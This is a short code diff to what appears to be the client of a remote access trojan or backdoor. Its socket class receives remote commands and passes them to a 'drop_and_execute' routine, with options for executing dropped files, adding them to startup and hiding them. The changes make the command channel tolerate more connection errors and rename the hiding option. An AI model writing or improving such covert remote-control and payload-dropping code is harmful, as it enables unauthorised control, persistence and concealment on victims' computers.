@@ -23,7 +23,7 @@ class Socket:
     def receive_command(self):
         try:
             cmd = self.active_socket.recv(1024)
-        except ConnectionResetError:
+        except (ConnectionResetError, ConnectionRefusedError, TimeoutError, socket.error):
             self.established = False
             return False
 
@@ -47,7 +47,7 @@ class Socket:
                 cmd = cmd.replace("-h ", "")
             cmd = cmd.replace("-batch ", "")
 
-            drop_and_execute(cmd, execute_file=execute, startup=startup, hide_file=hide_file)
+            drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
 
         else:
             try:
